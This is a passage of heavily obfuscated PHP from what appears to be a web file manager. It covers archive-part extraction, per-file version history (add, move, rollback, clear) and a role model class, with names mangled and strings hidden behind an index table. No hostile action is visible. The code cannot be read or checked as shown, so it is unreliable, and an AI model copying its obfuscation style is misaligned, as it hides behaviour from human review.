($äØùŠ as $œ…Å¾Ãº) { $¡ÂÙÖŒÏ = $œ…Å¾Ãº[$Ø®âöÑ¿[84]]; if ($é€¤øÌ·) { $¡ÂÙÖŒÏ = self::copy($œ…Å¾Ãº[$Ø®âöÑ¿[84]], $é€¤øÌ·, $Ø®âöÑ¿[824]); } else { $ÒÈìğÅß = self::init($œ…Å¾Ãº[$Ø®âöÑ¿[84]]); if ($ÒÈìğÅß->getType() == $Ø®âöÑ¿[106]) { $¡ÂÙÖŒÏ = $ÒÈìğÅß->path; } } if ($¡ÂÙÖŒÏ && self::local()->exist($¡ÂÙÖŒÏ)) { $½’ÜĞ”Û[$œ…Å¾Ãº[$Ø®âöÑ¿[84]]] = $¡ÂÙÖŒÏ; } } if (!empty($½’ÜĞ”Û)) { return array_values($½’ÜĞ”Û); } show_json(LNG($Ø®âöÑ¿[1171]), !1); } private static function localFilePath($¢òâŸÔÈ) { $ª€­ÕÏå =& $_SERVER[§ŒØóıü]; $–˜±ğŞÎ = KodIO::parse($¢òâŸÔÈ); if ($–˜±ğŞÎ[$ª€­ÕÏå[33]] == KodIO::KOD_SOURCE) { $ÜÔ»«Ÿ = Model($ª€­ÕÏå[831])->fileInfoGet(KodIO::sourceID($¢òâŸÔÈ)); if (!$ÜÔ»«Ÿ[$ª€­ÕÏå[84]]) { show_json($ª€­ÕÏå[1209], !1); } $¢òâŸÔÈ = $ÜÔ»«Ÿ[$ª€­ÕÏå[84]]; } $İ¥²ÈĞ÷ = self::init($¢òâŸÔÈ); if ($İ¥²ÈĞ÷->pathParse[$ª€­ÕÏå[1157]]) { $¢òâŸÔÈ = $İ¥²ÈĞ÷->pathParse[$ª€­ÕÏå[1157]]; $İ¥²ÈĞ÷ = self::init($¢òâŸÔÈ); } $÷†ê×ãø = $İ¥²ÈĞ÷->getType(); if ($÷†ê×ãø == $ª€­ÕÏå[106] || $÷†ê×ãø == $ª€­ÕÏå[1210]) { if (!$İ¥²ÈĞ÷->exist($İ¥²ÈĞ÷->path)) { show_json(LNG($ª€­ÕÏå[105]), !1); } return $İ¥²ÈĞ÷->path; } return !1; } public static function unzipPart($ø¬âª“Ç, $Ï©êÀÂ = -1) { $›óÑığ =& $_SERVER[§ŒØóıü]; $ÚŞö¿øõ = IO::pathThis($ø¬âª“Ç); if (!$Ï©êÀÂ || $Ï©êÀÂ == -1) { $î²ÒĞøû = array(array($›óÑığ[32] => $ÚŞö¿øõ, $›óÑığ[1196] => -1)); $î²ÒĞøû[0][$›óÑığ[1211]] = $î²ÒĞøû[0][$›óÑığ[32]]; } else { if (is_array($Ï©êÀÂ)) { $î²ÒĞøû = $Ï©êÀÂ; $ÉÈúœ•Û = count($î²ÒĞøû) - 1; for ($áùæÈÖÛ = 0; $áùæÈÖÛ <= $ÉÈúœ•Û; $áùæÈÖÛ++) { $òÒÅ’ß× = $î²ÒĞøû[$áùæÈÖÛ]; $ãŸ³üúì = get_path_this($òÒÅ’ß×[$›óÑığ[32]]) . (checkExtSafe($òÒÅ’ß×[$›óÑığ[32]]) ? $›óÑığ[12] : $›óÑığ[1212]); $î²ÒĞøû[$áùæÈÖÛ][$›óÑığ[1211]] = $›óÑığ[1213] . intval($òÒÅ’ß×[$›óÑığ[1196]]) . $›óÑığ[386] . $ãŸ³üúì; if ($áùæÈÖÛ == 0) { continue; } $î²ÒĞøû[$áùæÈÖÛ][$›óÑığ[1211]] = $î²ÒĞøû[$áùæÈÖÛ - 1][$›óÑığ[1211]] . $›óÑığ[1214] . $î²ÒĞøû[$áùæÈÖÛ][$›óÑığ[1211]]; } } } if (!is_array($î²ÒĞøû) || count($î²ÒĞøû) == 0) { return !1; } $ÇëÛ®Ô = $î²ÒĞøû[count($î²ÒĞøû) - 1]; if (!IO::exist($ø¬âª“Ç)) { return !1; } $¼¹èìë = TEMP_FILES . $›óÑığ[1215] . kodIO::hashPathSafe($ø¬âª“Ç) . $›óÑığ[8]; $ÙÓßßéñ = $¼¹èìë . $ÇëÛ®Ô[$›óÑığ[1211]]; mk_dir($¼¹èìë); file_put_contents(TEMP_FILES . $›óÑığ[1190], $›óÑığ[12]); if (IO::exist($ÙÓßßéñ)) { return array($›óÑığ[200] => $ÙÓßßéñ, $›óÑığ[1195] => $î²ÒĞøû, $›óÑığ[1197] => $¼¹èìë); } $§Ì“‘Ï¦ = self::localFilePath($ø¬âª“Ç); if (!$§Ì“‘Ï¦) { $§Ì“‘Ï¦ = $¼¹èìë . $›óÑığ[1216]; if (!IO::exist($§Ì“‘Ï¦)) { self::copy($ø¬âª“Ç, $¼¹èìë, !1, get_path_this($§Ì“‘Ï¦)); } } if (!$§Ì“‘Ï¦ || !IO::exist($§Ì“‘Ï¦)) { return !1; } if ($ÇëÛ®Ô[$›óÑığ[1196]] == -1) { return array($›óÑığ[200] => $§Ì“‘Ï¦, $›óÑığ[1195] => $î²ÒĞøû, $›óÑığ[1197] => $¼¹èìë); } $ÇÅÄ‡ƒ = $§Ì“‘Ï¦; foreach ($î²ÒĞøû as $áùæÈÖÛ => $òÒÅ’ß×) { if (!$òÒÅ’ß× || $òÒÅ’ß×[$›óÑığ[1196]] == $›óÑığ[1194]) { break; } if (substr($òÒÅ’ß×[$›óÑığ[32]], -1, 1) == $›óÑığ[8]) { break; } $ºéĞÍ« = in_array(get_path_ext($òÒÅ’ß×[$›óÑığ[1211]]), array($›óÑığ[313], $›óÑığ[1201], $›óÑığ[1202], $›óÑığ[1203], $›óÑığ[1204], $›óÑığ[1205])); $¾¯¤ Œ = $áùæÈÖÛ == count($î²ÒĞøû) - 1 && $ºéĞÍ«; $¨Ò¿ú÷… = $¼¹èìë . $òÒÅ’ß×[$›óÑığ[1211]]; $şÊ€‡¤¡ = $¼¹èìë . get_path_this($òÒÅ’ß×[$›óÑığ[32]]); if (IO::exist($¨Ò¿ú÷…)) { $ÇÅÄ‡ƒ = $¨Ò¿ú÷…; continue; } $³¨²¦—ï = $áùæÈÖÛ == 0 ? get_path_ext($ÚŞö¿øõ) : get_path_ext($ÇÅÄ‡ƒ); $³«†¦†Ü = KodArchive::extract(self::iconvSystem($ÇÅÄ‡ƒ), $¼¹èìë, $òÒÅ’ß×[$›óÑığ[1196]], $õÓéã£É, $³¨²¦—ï); self::unzipErrorCheck($³«†¦†Ü, array($›óÑığ[1217], $ø¬âª“Ç, $î²ÒĞøû, $òÒÅ’ß×, $¨Ò¿ú÷…)); if (IO::exist($şÊ€‡¤¡)) { IO::rename($şÊ€‡¤¡, get_path_this($¨Ò¿ú÷…)); } $ÇÅÄ‡ƒ = $¨Ò¿ú÷…; } $ÙÓßßéñ = $ÇÅÄ‡ƒ; return array($›óÑığ[200] => $ÇÅÄ‡ƒ, $›óÑığ[1195] => $î²ÒĞøû, $›óÑığ[1197] => $¼¹èìë); } private static function unzipErrorCheck($—³ƒ…š£, $áÅøÓ§¹ = false) { $ÏÛùõ¦» =& $_SERVER[§ŒØóıü]; if ($—³ƒ…š£[$ÏÛùõ¦»[1218]]) { return !0; } write_log(array($ÏÛùõ¦»[1219], $—³ƒ…š£, $áÅøÓ§¹), $ÏÛùõ¦»[1220]); show_json($ÏÛùõ¦»[1221] . json_encode($—³ƒ…š£[$ÏÛùõ¦»[1208]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $É¸‘¦ø =& $_SERVER[§ŒØóıü]; $ñµ´½Š = $GLOBALS[$É¸‘¦ø[6]][$É¸‘¦ø[89]]; if ($ñµ´½Š[$É¸‘¦ø[1222]] != 1) { return; } if ($ñµ´½Š[$É¸‘¦ø[1223]] <= 0) { return; } if (isset($_REQUEST[$É¸‘¦ø[1224]]) && $_REQUEST[$É¸‘¦ø[1224]] == $É¸‘¦ø[88]) { return; } Hook::bind($É¸‘¦ø[1225], $É¸‘¦ø[1226]); Hook::bind($É¸‘¦ø[1227], $É¸‘¦ø[1228]); Hook::bind($É¸‘¦ø[1229], $É¸‘¦ø[1230]); Hook::bind($É¸‘¦ø[1231], $É¸‘¦ø[1232]); Hook::bind($É¸‘¦ø[1233], $É¸‘¦ø[1234]); Hook::bind($É¸‘¦ø[1235], $É¸‘¦ø[1236]); } public static function eventBeforeUpload($ËÏì©‰¥) { if ($ËÏì©‰¥[3] && $ËÏì©‰¥[3] != REPEAT_REPLACE) { return; } $Ö éƒ©ˆ = self::parsePath($ËÏì©‰¥[0]); if (!$Ö éƒ©ˆ) { return; } self::add($Ö éƒ©ˆ); } public static function eventBeforeEdit($Á°Ö´·) { $€‰ŒÂ = self::parsePath($Á°Ö´·[0]); if (!$€‰ŒÂ) { return; } self::add($€‰ŒÂ); } public static function eventBeforeCopyFile($Îœğœ¹•, $ÂœÅœÙÃ, $——«š¾Ï, $¼õòÒŞ, $Àş–Ñàå, $ü¢¡˜×) { $‹Ùàù¶Œ =& $_SERVER[§ŒØóıü]; if (isset($——«š¾Ï->_data[$‹Ùàù¶Œ[1161]]) && $——«š¾Ï->_data[$‹Ùàù¶Œ[1161]]) { return; } $àôĞÜ‡ï = $——«š¾Ï->getPathOuter($¼õòÒŞ); $¶©ç´ƒê = self::parsePath($àôĞÜ‡ï); if (!$¶©ç´ƒê) { return; } self::add($¶©ç´ƒê); } public static function eventBeforeRename($¥ìº¥„×) { $øú…øı¿ =& $_SERVER[§ŒØóıü]; $¢æÑŠçÊ = self::parsePath($¥ìº¥„×[0]); if (!$¢æÑŠçÊ) { return; } $ø¼ÎñÔ¬ = self::checkInHistory($¢æÑŠçÊ); if (!$ø¼ÎñÔ¬) { return; } if ($ø¼ÎñÔ¬[$øú…øı¿[33]] == $øú…øı¿[200]) { $€î—‹öÌ = self::listData($¢æÑŠçÊ); if ($€î—‹öÌ && $€î—‹öÌ[$øú…øı¿[369]]) { self::moveHistory($¢æÑŠçÊ, $¥ìº¥„×[1]); } } else { IO::rename($ø¼ÎñÔ¬[$øú…øı¿[84]], $¥ìº¥„×[1]); } } public static function eventBeforeMove($Å»íÈ¤) { $È¾òâÍÛ =& $_SERVER[§ŒØóıü]; $ˆ¸·ç¾ê = self::parsePath($Å»íÈ¤[0]); if (!$ˆ¸·ç¾ê) { return; } $É´ºñÙ = self::parsePath($Å»íÈ¤[1]); if (!$É´ºñÙ) { return; } $ İóìŠâ = $Å»íÈ¤[3]; $ÕíÌá‚÷ = self::checkInHistory($ˆ¸·ç¾ê); if (!$ÕíÌá‚÷) { return; } $ÇáÛö•Ì = self::pathHistory($É´ºñÙ); if ($ÕíÌá‚÷[$È¾òâÍÛ[33]] == $È¾òâÍÛ[200]) { $Ì¿Ù¦ÒÂ = self::listData($ˆ¸·ç¾ê); $ÓÑö»Ò¤ = rtrim($É´ºñÙ, $È¾òâÍÛ[8]) . $È¾òâÍÛ[8] . ($ İóìŠâ ? $ İóìŠâ : get_path_this($ˆ¸·ç¾ê)); $±üìÀ´ = self::listData($ÓÑö»Ò¤); if ($Ì¿Ù¦ÒÂ && $Ì¿Ù¦ÒÂ[$È¾òâÍÛ[369]] && $±üìÀ´ && $±üìÀ´[$È¾òâÍÛ[369]]) { return self::clear($ˆ¸·ç¾ê); } if ($Ì¿Ù¦ÒÂ && $Ì¿Ù¦ÒÂ[$È¾òâÍÛ[369]]) { self::moveHistory($ˆ¸·ç¾ê, $ İóìŠâ, $ÇáÛö•Ì); } } else { IO::move($ÕíÌá‚÷[$È¾òâÍÛ[84]], $ÇáÛö•Ì, !1, $ İóìŠâ); self::clearEmptyFolder(IO::pathFather($ÕíÌá‚÷[$È¾òâÍÛ[84]])); } } public static function eventAfterRemove($ÁÚ¼¼Ü´, $İˆÍ•øÑ) { $­‹›ºùå =& $_SERVER[§ŒØóıü]; if (!$İˆÍ•øÑ) { return; } $‚öèíÇ” = self::parsePath($ÁÚ¼¼Ü´[0]); if (!$‚öèíÇ”) { return; } $è¹ß»êÈ = self::checkInHistory($‚öèíÇ”); if (!$è¹ß»êÈ) { return; } if ($è¹ß»êÈ[$­‹›ºùå[33]] == $­‹›ºùå[200]) { $ºÛúä¤Æ = self::listData($‚öèíÇ”, !1); if ($ºÛúä¤Æ && $ºÛúä¤Æ[$­‹›ºùå[369]]) { self::clear($‚öèíÇ”, !1); } } else { IO::remove($è¹ß»êÈ[$­‹›ºùå[84]]); self::clearEmptyFolder(IO::pathFather($è¹ß»êÈ[$­‹›ºùå[84]])); } } private static function checkInHistory($ŠÄø¶«€) { $Ñ¢‹úÑ = self::pathHistory($ŠÄø¶«€); if (!IO::exist($Ñ¢‹úÑ)) { $Ñ¢‹úÑ .= $_SERVER[§ŒØóıü][1237]; } return IO::exist($Ñ¢‹úÑ) ? IO::info($Ñ¢‹úÑ) : !1; } private static function parsePath($Ïó”ï¨Ó) { $”äŠ®´ =& $_SERVER[§ŒØóıü]; if (!$Ïó”ï¨Ó) { return !1; } if ($GLOBALS[$”äŠ®´[1238]]) { return; } $Ú›â‘ = KodIO::parse($Ïó”ï¨Ó); $Åå¯©ñÇ = $Ú›â‘[$”äŠ®´[33]]; $“ã­Àå· = !$Åå¯©ñÇ || $Åå¯©ñÇ == KodIO::KOD_IO || $Åå¯©ñÇ == KodIO::KOD_SHARE_ITEM; if (!$“ã­Àå· || !$Ú›â‘[$”äŠ®´[1239]]) { return !1; } if (substr($Ïó”ï¨Ó, 0, strlen(DATA_PATH . $”äŠ®´[1240])) == DATA_PATH . $”äŠ®´[1240]) { return !1; } if ($Åå¯©ñÇ == KodIO::KOD_SHARE_ITEM) { $ ¨øÒùè = IO::init($Ïó”ï¨Ó); if ($ ¨øÒùè->pathParse[$”äŠ®´[1157]]) { return self::parsePath($ ¨øÒùè->pathParse[$”äŠ®´[1157]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $åšÅªÎ§ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $”äŠ®´[1241]); foreach ($åšÅªÎ§ as $ï«ıÔÑ²) { if (!$Åå¯©ñÇ && substr($Ïó”ï¨Ó, 0, strlen($ï«ıÔÑ²)) == $ï«ıÔÑ²) { return !1; } } self::log($GLOBALS[$”äŠ®´[1152]] . $”äŠ®´[1242] . $Ïó”ï¨Ó); return $Ïó”ï¨Ó; } private static function pathHistory($ßàë§”Š) { $“õêÕø =& $_SERVER[§ŒØóıü]; $ÔÎÔâ® = self::$_historyBase . ltrim(KodIO::clear($ßàë§”Š), $“õêÕø[8]); $ÔÎÔâ® = str_replace(array($“õêÕø[1243]), array($“õêÕø[1244]), $ÔÎÔâ®); return $ÔÎÔâ®; } public static function log($Ê’¶‹÷Ú) { } public static function historyCount($‰­Ğ‚Ç½) { $ú…¦£²Å =& $_SERVER[§ŒØóıü]; $Š™êÚ—Â = array(); $à²µµ = array(); foreach ($‰­Ğ‚Ç½ as $Ñ¯Œ¾ğÙ) { $Ú¯¸ûÖ = get_path_father($Ñ¯Œ¾ğÙ); if (!$à²µµ[$Ú¯¸ûÖ]) { $à²µµ[$Ú¯¸ûÖ] = array(); } $à²µµ[$Ú¯¸ûÖ][] = get_path_this($Ñ¯Œ¾ğÙ); } foreach ($à²µµ as $Ú¯¸ûÖ => $•Õ‡ó½Á) { $ŸãÀ‚Ó© = self::parsePath($Ú¯¸ûÖ); if (!$ŸãÀ‚Ó©) { continue; } foreach ($•Õ‡ó½Á as $›øÎ‡·) { $÷ùˆã”œ = self::listData(rtrim($ŸãÀ‚Ó©, $ú…¦£²Å[8]) . $ú…¦£²Å[8] . $›øÎ‡·, !1); if ($÷ùˆã”œ && $÷ùˆã”œ[$ú…¦£²Å[369]]) { $Š™êÚ—Â[rtrim($Ú¯¸ûÖ, $ú…¦£²Å[8]) . $ú…¦£²Å[8] . $›øÎ‡·] = count($÷ùˆã”œ[$ú…¦£²Å[369]]); } } } return $Š™êÚ—Â; } public static function add($Š‡—üâ) { $òå¡£«™ =& $_SERVER[§ŒØóıü]; $ŒÅªŞ» = self::listData($Š‡—üâ); if (!$ŒÅªŞ») { return; } $Ğ—¤ÃüÛ = Model($òå¡£«™[776])->get($òå¡£«™[1245]); $øÁÁ³¯€ = $GLOBALS[$òå¡£«™[6]][$òå¡£«™[89]][$òå¡£«™[1223]]; $ıîëÑê = $Ğ—¤ÃüÛ == $òå¡£«™[1246] ? min(5, $øÁÁ³¯€) : $øÁÁ³¯€; if ($øÁÁ³¯€ <= 0) { return; } $é•Ì¯ = IO::info($Š‡—üâ); $…«½õëü = $ŒÅªŞ»[$òå¡£«™[369]]; if ($é•Ì¯[$òå¡£«™[76]] == 0) { return; } if ($é•Ì¯[$òå¡£«™[76]] >= 1024 * 1024 * 500) { return !1; } $‡µàóÏñ = IO::hashSimple($Š‡—üâ); if ($…«½õëü && $…«½õëü[0][$òå¡£«™[177]] == $‡µàóÏñ) { return !0; } if (array_key_exists($òå¡£«™[203], $é•Ì¯) && !$é•Ì¯[$òå¡£«™[203]]) { return !1; } $›×ù¥ÚØ = short_id(time()); $Õ¡÷Åã÷ = array($òå¡£«™[399] => $›×ù¥ÚØ, $òå¡£«™[177] => $‡µàóÏñ, $òå¡£«™[32] => $é•Ì¯[$òå¡£«™[32]] . $òå¡£«™[10] . date($òå¡£«™[1247]) . rand_string(1), $òå¡£«™[76] => $é•Ì¯[$òå¡£«™[76]], $òå¡£«™[454] => USER_ID, $òå¡£«™[201] => time(), $òå¡£«™[1248] => $òå¡£«™[12]); IO::mkdir($ŒÅªŞ»[$òå¡£«™[1249]]); $ìşø›¦È = IO::copy($Š‡—üâ, $ŒÅªŞ»[$òå¡£«™[1249]], !1, $Õ¡÷Åã÷[$òå¡£«™[32]]); if (!$ìşø›¦È) { self::clearEmptyFolder($ŒÅªŞ»[$òå¡£«™[1249]]); return !1; } array_unshift($…«½õëü, $Õ¡÷Åã÷); if (count($…«½õëü) > $ıîëÑê) { $‡¾Ëü÷Ÿ = array_slice($…«½õëü, $ıîëÑê); foreach ($‡¾Ëü÷Ÿ as $ï”¡Àö€) { IO::remove($ŒÅªŞ»[$òå¡£«™[1249]] . $ï”¡Àö€[$òå¡£«™[32]]); } $…«½õëü = array_slice($…«½õëü, 0, $ıîëÑê); } return self::saveData($ŒÅªŞ»[$òå¡£«™[1250]], $…«½õëü); } public static function remove($Êìãåƒ†, $õ—ß¦şÑ) { $ŒœŞ¢’ç =& $_SERVER[§ŒØóıü]; $ë½ú­‹‡ = self::listData($Êìãåƒ†); $Ã»‚êºÚ = array(); if (!$ë½ú­‹‡) { return !1; } foreach ($ë½ú­‹‡[$ŒœŞ¢’ç[369]] as $¹¯Öœ›) { if ($¹¯Öœ›[$ŒœŞ¢’ç[399]] == $õ—ß¦şÑ) { IO::remove($ë½ú­‹‡[$ŒœŞ¢’ç[1249]] . $¹¯Öœ›[$ŒœŞ¢’ç[32]]); continue; } $Ã»‚êºÚ[] = $¹¯Öœ›; } return self::saveData($ë½ú­‹‡[$ŒœŞ¢’ç[1250]], $Ã»‚êºÚ); } public static function clear($µ‰„®Ë, $·Üô”Â‰ = true) { $İ™†¯Ğ§ =& $_SERVER[§ŒØóıü]; $šßÜ¼× = self::listData($µ‰„®Ë, $·Üô”Â‰); if (!$šßÜ¼×) { return !1; } foreach ($šßÜ¼×[$İ™†¯Ğ§[369]] as $À„œÊı) { IO::remove($šßÜ¼×[$İ™†¯Ğ§[1249]] . $À„œÊı[$İ™†¯Ğ§[32]]); } return self::saveData($šßÜ¼×[$İ™†¯Ğ§[1250]], array()); } public static function moveHistory($¯ĞğÇ‘Ş, $¢ò»˜û¢ = '', $²Ø°‚Îû = '') { $»¼Š¼£Ä =& $_SERVER[§ŒØóıü]; $Œ‰êºş = self::listData($¯ĞğÇ‘Ş, !1); if (!$Œ‰êºş || !$Œ‰êºş[$»¼Š¼£Ä[369]]) { return !1; } $­Ë÷¦–ì = $»¼Š¼£Ä[1237]; $¢ò»˜û¢ = $¢ò»˜û¢ ? $¢ò»˜û¢ : get_path_this($¯ĞğÇ‘Ş); $²Ø°‚Îû = $²Ø°‚Îû ? $²Ø°‚Îû : $Œ‰êºş[$»¼Š¼£Ä[1249]]; $Á“¦ƒ»ş = substr(get_path_this($Œ‰êºş[$»¼Š¼£Ä[1250]]), 0, -strlen($­Ë÷¦–ì)); foreach ($Œ‰êºş[$»¼Š¼£Ä[369]] as $öÍä¬¡¦ => $¬”ˆü¨) { $ñ“À¸Å¬ = $¢ò»˜û¢ . substr($¬”ˆü¨[$»¼Š¼£Ä[32]], strlen($Á“¦ƒ»ş)); $Çìù—ä = IO::move($Œ‰êºş[$»¼Š¼£Ä[1249]] . $¬”ˆü¨[$»¼Š¼£Ä[32]], $²Ø°‚Îû, !1, $ñ“À¸Å¬); if ($Çìù—ä) { $Œ‰êºş[$»¼Š¼£Ä[369]][$öÍä¬¡¦][$»¼Š¼£Ä[32]] = $ñ“À¸Å¬; } } $Œ‰êºş[$»¼Š¼£Ä[1250]] = IO::move($Œ‰êºş[$»¼Š¼£Ä[1250]], $²Ø°‚Îû, !1, $¢ò»˜û¢ . $­Ë÷¦–ì); self::saveData($Œ‰êºş[$»¼Š¼£Ä[1250]], $Œ‰êºş[$»¼Š¼£Ä[369]]); self::clearEmptyFolder($Œ‰êºş[$»¼Š¼£Ä[1249]]); } public static function rollback($ˆı…’Ê¨, $–Í‰š”Œ) { $’¶¸ÕÃƒ =& $_SERVER[§ŒØóıü]; $ó†ÂòØ£ = self::listData($ˆı…’Ê¨); if (!$ó†ÂòØ£) { return; } $ÕŒ·´Šù = IO::info($ˆı…’Ê¨); foreach ($ó†ÂòØ£[$’¶¸ÕÃƒ[369]] as $øæ¥Ñ£ => $òˆì¤îı) { if ($òˆì¤îı[$’¶¸ÕÃƒ[399]] == $–Í‰š”Œ) { self::add($ˆı…’Ê¨); $éŠ£†»â = $ó†ÂòØ£[$’¶¸ÕÃƒ[1249]] . $òˆì¤îı[$’¶¸ÕÃƒ[32]]; $÷íÄÅÍÛ = IO::copy($éŠ£†»â, IO::pathFather($ˆı…’Ê¨), REPEAT_REPLACE, $ÕŒ·´Šù[$’¶¸ÕÃƒ[32]]); if ($÷íÄÅÍÛ) { self::remove($ˆı…’Ê¨, $–Í‰š”Œ); } return $÷íÄÅÍÛ; } } return !1; } public static function setDetail($­ˆè¬âı, $˜Éßºüš, $Û¬åªïÅ) { $“—éƒ¶ =& $_SERVER[§ŒØóıü]; $èÈ²ö©¤ = self::listData($­ˆè¬âı); if (!$èÈ²ö©¤) { return; } foreach ($èÈ²ö©¤[$“—éƒ¶[369]] as $¿ïï«Ì => $×ÓÌ¢¤») { if ($×ÓÌ¢¤»[$“—éƒ¶[399]] == $˜Éßºüš) { $èÈ²ö©¤[$“—éƒ¶[369]][$¿ïï«Ì][$“—éƒ¶[1248]] = $Û¬åªïÅ; self::saveData($èÈ²ö©¤[$“—éƒ¶[1250]], $èÈ²ö©¤[$“—éƒ¶[369]]); return !0; } } return !1; } public static function fileInfo($ÆíĞæÅ, $¯²Ò¸ì) { $…¯çë§œ =& $_SERVER[§ŒØóıü]; $áœ§Ü¨Œ = self::listData($ÆíĞæÅ); if (!$áœ§Ü¨Œ) { show_json(LNG($…¯çë§œ[105]), !1); } $›Šå‹ó = $…¯çë§œ[12]; foreach ($áœ§Ü¨Œ[$…¯çë§œ[369]] as $µ×„”Ë„ => $ô¥ü²—Ç) { if ($ô¥ü²—Ç[$…¯çë§œ[399]] != $¯²Ò¸ì) { continue; } $›Šå‹ó = $áœ§Ü¨Œ[$…¯çë§œ[1249]] . $ô¥ü²—Ç[$…¯çë§œ[32]]; break; } if (!$›Šå‹ó) { show_json(LNG($…¯çë§œ[105]), !1); } return IO::info($›Šå‹ó); } public static function fileOut($•Ú·Çíì, $ÓäœôÎİ, $ÈßõË‘Ì = false) { $Ì²Ë òî =& $_SERVER[§ŒØóıü]; $¥ÙÆ·óÖ = self::fileInfo($•Ú·Çíì, $ÓäœôÎİ); $¢ñ‚Ûà“ =& $GLOBALS[$Ì²Ë òî[7]]; $ÈßõË‘Ì = isset($¢ñ‚Ûà“[$Ì²Ë òî[1200]]) && $¢ñ‚Ûà“[$Ì²Ë òî[1200]] == 1; if (isset($¢ñ‚Ûà“[$Ì²Ë òî[33]]) && $¢ñ‚Ûà“[$Ì²Ë òî[33]] == $Ì²Ë òî[1251]) { return IO::fileOutImage($¥ÙÆ·óÖ[$Ì²Ë òî[84]], $¢ñ‚Ûà“[$Ì²Ë òî[1252]]); } IO::fileOut($¥ÙÆ·óÖ[$Ì²Ë òî[84]], $ÈßõË‘Ì, get_path_this($•Ú·Çíì)); } public static function listData($Ê¾ê›—İ, $ƒÇãÉŞ = true) { $¶õœªâï =& $_SERVER[§ŒØóıü]; if ($ƒÇãÉŞ && !IO::exist($Ê¾ê›—İ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Ê¾ê›—İ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $òœ¼—Õş = self::pathHistory($Ê¾ê›—İ); $¸ê¨‡½« = array($¶õœªâï[1250] => $òœ¼—Õş . $¶õœªâï[1237], $¶õœªâï[1249] => rtrim(get_path_father($òœ¼—Õş), $¶õœªâï[8]) . $¶õœªâï[8], $¶õœªâï[369] => array()); $™‘ááÆê = IO::getContent($¸ê¨‡½«[$¶õœªâï[1250]]); if ($™‘ááÆê) { $™Šè£¶æ = json_decode($™‘ááÆê, !0); if (is_array($™Šè£¶æ)) { $¸ê¨‡½«[$¶õœªâï[369]] = $™Šè£¶æ; } } return $¸ê¨‡½«; } private static function saveData($ö´–òíˆ, $ëò’ÆíÂ) { $‹Úòµ™Æ =& $_SERVER[§ŒØóıü]; self::log($‹Úòµ™Æ[1253] . $ö´–òíˆ . $‹Úòµ™Æ[71] . count($ëò’ÆíÂ), $‹Úòµ™Æ[757]); if ($ëò’ÆíÂ) { return IO::setContent($ö´–òíˆ, json_encode($ëò’ÆíÂ)); } $§äÏãÒš = IO::pathFather($ö´–òíˆ); IO::remove($ö´–òíˆ); self::clearEmptyFolder($§äÏãÒš); return !0; } public static function clearEmptyFolder($ÄÜ—Ò‘ç) { $Ÿœ¦‘¯ğ =& $_SERVER[§ŒØóıü]; if (trim($ÄÜ—Ò‘ç, $Ÿœ¦‘¯ğ[8]) == trim(self::$_historyBase, $Ÿœ¦‘¯ğ[8])) { return; } $ü£¢…Îä = IO::pathFather($ÄÜ—Ò‘ç); $ÑÚ¨á¯ = IO::has($ÄÜ—Ò‘ç, !0); if ($ÑÚ¨á¯[$Ÿœ¦‘¯ğ[207]] > 0 || $ÑÚ¨á¯[$Ÿœ¦‘¯ğ[208]] > 0) { return; } IO::remove($ÄÜ—Ò‘ç); self::clearEmptyFolder($ü£¢…Îä); } private static function getBasePath() { $¬Ë…÷†Ã =& $_SERVER[§ŒØóıü]; $—¨ÒÚÈÇ = Model($¬Ë…÷†Ã[1254])->get($¬Ë…÷†Ã[1255]); if ($—¨ÒÚÈÇ) { if (!IO::exist($—¨ÒÚÈÇ)) { IO::mkdir($—¨ÒÚÈÇ); } if (get_path_this($—¨ÒÚÈÇ) == $¬Ë…÷†Ã[1240]) { $Å›¬ïˆ’ = $¬Ë…÷†Ã[1256] . rand_string(8); @rename($—¨ÒÚÈÇ, get_path_father($—¨ÒÚÈÇ) . $¬Ë…÷†Ã[8] . $Å›¬ïˆ’); $—¨ÒÚÈÇ = DATA_PATH . $Å›¬ïˆ’ . $¬Ë…÷†Ã[8]; file_put_contents(DATA_PATH . $¬Ë…÷†Ã[1190], $¬Ë…÷†Ã[12]); Model($¬Ë…÷†Ã[1254])->set($¬Ë…÷†Ã[1255], $—¨ÒÚÈÇ); } return $—¨ÒÚÈÇ; } $—¨ÒÚÈÇ = DATA_PATH . $¬Ë…÷†Ã[1256] . rand_string(8) . $¬Ë…÷†Ã[8]; $—¨ÒÚÈÇ = IO::mkdir($—¨ÒÚÈÇ); $—¨ÒÚÈÇ = rtrim($—¨ÒÚÈÇ, $¬Ë…÷†Ã[8]) . $¬Ë…÷†Ã[8]; file_put_contents($—¨ÒÚÈÇ . $¬Ë…÷†Ã[1190], $¬Ë…÷†Ã[12]); file_put_contents(DATA_PATH . $¬Ë…÷†Ã[1190], $¬Ë…÷†Ã[12]); Model($¬Ë…÷†Ã[1254])->set($¬Ë…÷†Ã[1255], $—¨ÒÚÈÇ); return $—¨ÒÚÈÇ; } } goto CÄÙÚà»¼Ã; Fôó‰‡Ò„¢: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\162\x6f\154\145\114\x69\x73\164"; public $field = array("\156\141\x6d\x65", "\x61\x75\x74\x68", "\x6c\x61\142\145\154", "\144\151\163\160\x6c\x61\171", "\x73\x79\x73\164\x65\155", "\144\x65\x73\143", "\151\x67\156\157\x72\x65\x45\x78\x74", "\x69\147\156\x6f\162\x65\x46\x69\154\x65\123\x69\172\145", "\141\144\x6d\x69\x6e\x69\x73\164\x72\x61\x74\157\x72", "\x73\157\x72\164"); public function listData($Ïñµâ­Ğ = false, $ÖÆ‘ÅÂ˜ = "\x73\x6f\x72\x74", $½ÕŒĞ–Ë = false) { $Ù¢˜©» =& $_SERVER[§ŒØóıü]; $‰¾ÏŒê‘ = parent::listData($Ïñµâ­Ğ, $ÖÆ‘ÅÂ˜, $½ÕŒĞ–Ë); if (!$Ïñµâ­Ğ) { foreach ($‰¾ÏŒê‘ as $È”©Íì => $ûìÕËÏá) { if ($ûìÕËÏá[$Ù¢˜©»[2064]] == 1) { $‰¾ÏŒê‘[$È”©Íì][$Ù¢˜©»[453]] = LNG($Ù¢˜©»[2298]); } } } return $‰¾ÏŒê‘; } public function update($£ ğáŒ—, $æ©Ã°ÎÎ) { $®½™š®¼ =& $_SERVER[§ŒØóıü]; 